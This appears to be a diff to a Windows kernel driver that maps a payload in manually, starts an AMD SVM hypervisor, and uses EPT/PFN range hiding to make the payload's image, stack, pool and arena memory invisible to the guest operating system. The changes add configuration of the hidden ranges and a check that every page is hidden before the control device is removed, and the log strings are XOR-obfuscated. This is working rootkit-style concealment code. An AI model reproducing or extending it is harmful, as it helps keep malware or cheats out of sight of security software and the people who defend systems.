@@ -6752,6 +7208,14 @@ static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
         return false;
     }
 
+    // EPT/hook mode updates need the payload's host-visible ranges.  Apply
+    // them after the resident ranges are mapped; applying them before this
+    // point returns STATUS_INVALID_PARAMETER on a fresh AMD bootstrap.
+    if (!mapdriver_configure_resident_modes())
+    {
+        return false;
+    }
+
     if (!mapdriver_amd_svm_activate_all(pre.diag))
         return false;
 
@@ -6765,6 +7229,13 @@ static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
         return false;
 
 #if !VT_AMD_RELEASE_LEGACY_IMAGE_AFTER_HANDOFF
+    if (!Utils::payloadExports ||
+        !Utils::payloadExports->set_vmexit_target ||
+        Utils::payloadExports->set_vmexit_target(0) != PAYLOAD_RESULT_OK)
+    {
+        return false;
+    }
+
     bool const retained =
         Utils::imageBase != nullptr &&
         Utils::imageSize != 0 &&
@@ -7283,15 +7754,21 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
         // Bootstrap 释放门禁，避免 AMD 路径再次套用 Intel HOST_RSP 条件。
         bool const resident_ready =
             (g_payload_detached && mapdriver_hv_ready()) ||
-            mapdriver_unload_common(nullptr, true, false);
-        status = (resident_ready && mapdriver_install_resident_bootstrap_unload())
-            ? STATUS_SUCCESS
-            : STATUS_DEVICE_NOT_READY;
-        if (NT_SUCCESS(status) && mapdriver_hv_ready())
+            // Keep payload image/direct ranges hidden while the control path is
+            // still available.  The old false argument skipped those ranges,
+            // leaving DROPCTL with only host-stack/pool/arena coverage.
+            mapdriver_unload_common(nullptr, true, true);
+        status = STATUS_DEVICE_NOT_READY;
+        if (resident_ready && mapdriver_hv_ready())
         {
+#if VT_PAYLOAD_IMAGE_HIDE_ENABLED
             // release_bootstrap 所在页已经在安装 DriverUnload 前按 CPU 显现。
-            // 控制设备删除后不再存在普通 Resident IOCTL 入口，因此禁止在这里
-            // 全量显现 image/arena/pool；仅隐藏 Root-mode 已建立 Host 映射的数据。
+            // Repeat the range operation as an idempotent safety net before the
+            // control device is deleted.  unload_common already performed it
+            // while the runtime was fully reachable.
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide payload-image-direct enter\n"));
+            mapdriver_hide_payload_memory("handoff-dropctl-payload-image-direct");
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide payload-image-direct leave\n"));
             LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide host-stack enter\n"));
             mapdriver_hide_payload_host_stack("handoff-dropctl-host-stack");
             LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide host-stack leave\n"));
@@ -7307,6 +7784,53 @@ static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP I
             mapdriver_hide_payload_arena_used("handoff-dropctl-data-arena");
             LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl hide data-arena leave\n"));
 #endif
+            // Verify all configured payload ranges before deleting the only
+            // control device.  Without this check a partial PFN operation was
+            // indistinguishable from a complete resident hide in the logs.
+            mapctl_memcheck hide_check = {};
+            hide_check.flags = MAPCTL_MEMCHECK_FLAG_ALL;
+            mapdriver_memcheck_control(&hide_check);
+            bool const hide_ok =
+                hide_check.result == PAYLOAD_RESULT_OK &&
+                hide_check.done != 0 &&
+                hide_check.checked_pages != 0 &&
+                hide_check.hidden_pages == hide_check.checked_pages &&
+                hide_check.visible_pages == 0 &&
+                hide_check.unknown_pages == 0 &&
+                hide_check.translate_fail == 0 &&
+                hide_check.verify_fail == 0;
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] resident hide verify ok=%d result=0x%llX done=%llu checked=%llu hidden=%llu visible=%llu unknown=%llu translate_fail=%llu verify_fail=%llu\n"),
+                (int)hide_ok,
+                hide_check.result,
+                hide_check.done,
+                hide_check.checked_pages,
+                hide_check.hidden_pages,
+                hide_check.visible_pages,
+                hide_check.unknown_pages,
+                hide_check.translate_fail,
+                hide_check.verify_fail);
+            if (!hide_ok)
+            {
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl aborted: resident hide verification failed\n"));
+                delete_control_after_complete = false;
+                break;
+            }
+#else
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] handoff dropctl visible-image mode: hide verification skipped\n"));
+#endif
+
+            // 映像隐藏启用时先完成隐藏证明；可见模式直接安装轻量卸载门禁。
+            status = mapdriver_install_resident_bootstrap_unload()
+                ? STATUS_SUCCESS
+                : STATUS_DEVICE_NOT_READY;
+            if (NT_SUCCESS(status))
+            {
+                // The resident DriverUnload entry page is intentionally made
+                // guest-visible by the install gate so SCM can invoke it after
+                // DROPCTL.  All other image/direct/arena/pool pages were
+                // verified hidden immediately before this one-page exception.
+                LOG_DEBUG(_XOR_("[VtBootstrapDriver] resident hide exception: release entry page visible for SCM unload\n"));
+            }
         }
         delete_control_after_complete = NT_SUCCESS(status);
         break;
